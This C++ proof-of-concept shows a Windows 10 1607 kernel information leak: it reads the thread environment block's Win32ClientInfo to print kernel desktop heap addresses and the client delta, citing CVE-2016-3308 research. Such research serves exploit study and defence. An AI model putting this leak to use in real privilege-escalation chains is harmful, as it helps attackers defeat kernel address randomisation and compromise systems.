//Details from https://github.com/55-AA/CVE-2016-3308 and http://www.geoffchappell.com/studies/windows/win32/ntdll/structs/teb/index.htm
#include <Windows.h>
#include <iostream>

typedef struct _TEB {
	UCHAR ignored[0x0800];
	ULONG_PTR Win32ClientInfo[0x3E]; // some undocumented stuff , located at TEB + 800
} TEB, *PTEB;

// taken from reactOS https://doxygen.reactos.org/dd/d79/include_2ntuser_8h_source.html
typedef struct _DESKTOPINFO
{
    PVOID pvDesktopBase;
    PVOID pvDesktopLimit;
} DESKTOPINFO, *PDESKTOPINFO;

// pvDesktopBase points to the kernel address of the desktop heap
// ulClientDelta specifies the offset between userland image and kernel address
// ulClientDelta is used for computing the user-space address of desktop heap objects

// taken from reactOS https://reactos.org/wiki/Techwiki:Win32k/CLIENTINFO
// taken from https://github.com/55-AA/CVE-2016-3308
typedef struct _CLIENTINFO
{
    ULONG_PTR CI_flags;
    ULONG_PTR cSpins;
    DWORD dwExpWinVer;
    DWORD dwCompatFlags;
    DWORD dwCompatFlags2;
    DWORD dwTIFlags;
    PDESKTOPINFO pDeskInfo;
    ULONG_PTR ulClientDelta;
} CLIENTINFO, *PCLIENTINFO;

int main() {

    PTEB pTeb = NtCurrentTeb();
    PCLIENTINFO clientInfoStruct = (PCLIENTINFO)pTeb->Win32ClientInfo;
    // from Mortens Defcon 2017 talk slides

    ULONG_PTR ulClientDelta  = clientInfoStruct->ulClientDelta;
    PVOID pvDesktopBase = clientInfoStruct->pDeskInfo->pvDesktopBase;
    PVOID pvDesktopLimit = clientInfoStruct->pDeskInfo->pvDesktopLimit;

    std::cout << "\n[+] Windows 10 1607 DesktopHeap (TEB.Win32ClientInfo) kernel address leakage\n\n";

    std::cout << "\t[>] ulClientDelta                : " << "0x" << ulClientDelta << std::endl;
    std::cout << "\t[>] Kernel Desktop base address  : " << "0x" << pvDesktopBase << std::endl;
    std::cout << "\t[>] Kernel Desktop limit address : " << "0x" << pvDesktopLimit << std::endl;

    return 0;
}
